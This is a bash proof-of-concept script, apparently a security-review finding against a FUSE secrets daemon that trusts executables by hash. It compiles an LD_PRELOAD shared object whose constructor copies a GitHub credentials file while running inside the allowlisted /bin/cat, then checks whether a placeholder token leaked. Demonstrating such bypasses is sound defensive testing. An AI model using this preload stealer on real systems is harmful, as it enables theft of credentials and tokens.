#!/usr/bin/env bash
# Finding 4: content hash is not trusted execution.
# A dynamically linked allowlisted reader keeps its approved exe hash while an
# LD_PRELOAD shared object runs attacker code inside it. No sudo, no ptrace.
# The container runs as uid 1000 (matching the daemon and the real vscode
# remoteUser) so /bin/cat is identifiable and allowlisted by hash; the daemon
# serves it real bytes; the preloaded .so exfiltrates them.
set -u
. "$(dirname "$0")/common.sh"

build
rm -rf "$BACKING" "$MNT"; mkdir -p "$MNT"; seed

CATHASH=$(docker run --rm "$IMAGE" sha256sum /bin/cat | awk '{print $1}')
echo "allowlisted /bin/cat sha256 = $CATHASH"
echo "-- confirm /bin/cat is dynamically linked (LD_PRELOAD applies) --"
docker run --rm "$IMAGE" sh -c 'file /bin/cat; ldd /bin/cat 2>&1 | head'

# Malicious preload: constructor exfiltrates the secret when cat starts.
cat > "$SPIKE_ROOT/evil.c" <<'C'
#include <stdio.h>
__attribute__((constructor)) void steal(void) {
    FILE *f = fopen("/secrets/gh/hosts.yml", "r");
    FILE *o = fopen("/tmp/out/stolen", "w");
    if (f && o) { char b[4096]; size_t n; while ((n=fread(b,1,sizeof b,f))>0) fwrite(b,1,n,o); }
    if (f) fclose(f); if (o) fclose(o);
}
C
# Compile the .so ON THE HOST (the uid-1000 container cannot apt-install gcc).
# glibc target: build in a throwaway gcc container as root, then mount read-only.
mkdir -p "$SPIKE_ROOT/stolen"
docker run --rm -v "$SPIKE_ROOT/evil.c:/tmp/evil.c:ro" -v "$SPIKE_ROOT:/out" \
  gcc:13 sh -c 'gcc -shared -fPIC -o /out/evil.so /tmp/evil.c' || { echo "host compile failed"; exit 1; }
ls -la "$SPIKE_ROOT/evil.so"

unmount_stale
"$BIN" -backing "$BACKING" -mount "$MNT" -log "$LOG" -allow-other -hash-exe \
  -allow-sha256 "$CATHASH" > "$SPIKE_ROOT/daemon.out" 2>&1 &
for _ in $(seq 1 50); do mountpoint -q "$MNT" && break; sleep 0.1; done
mountpoint "$MNT"

CID=$(docker run -d --rm --user "$(id -u):$(id -g)" \
  -v "$MNT:/secrets:${PROP:-rshared}" \
  -v "$SPIKE_ROOT/evil.so:/tmp/evil.so:ro" \
  -v "$SPIKE_ROOT/stolen:/tmp/out" \
  "$IMAGE" sleep 300)

echo "== sanity: allowlisted cat (uid 1000) reads REAL bytes =="
docker exec "$CID" cat /secrets/gh/hosts.yml
echo "== run allowlisted cat with LD_PRELOAD=/tmp/evil.so =="
docker exec "$CID" sh -c 'LD_PRELOAD=/tmp/evil.so cat /secrets/gh/hosts.yml' || true
echo "== attacker exfiltration target (expect REAL token, proving hash != trust) =="
docker exec "$CID" sh -c 'cat /tmp/out/stolen 2>&1'
if grep -q gho_FAKE "$SPIKE_ROOT/stolen/stolen" 2>/dev/null; then
  echo "RESULT: LEAKED real token via LD_PRELOAD while exe hash unchanged"
else
  echo "RESULT: no real token exfiltrated"
fi
echo "== exe hash of the preloaded cat (must equal the allowlisted hash) =="
docker exec "$CID" sha256sum /bin/cat

docker rm -f "$CID" >/dev/null 2>&1 || true
stop_daemon
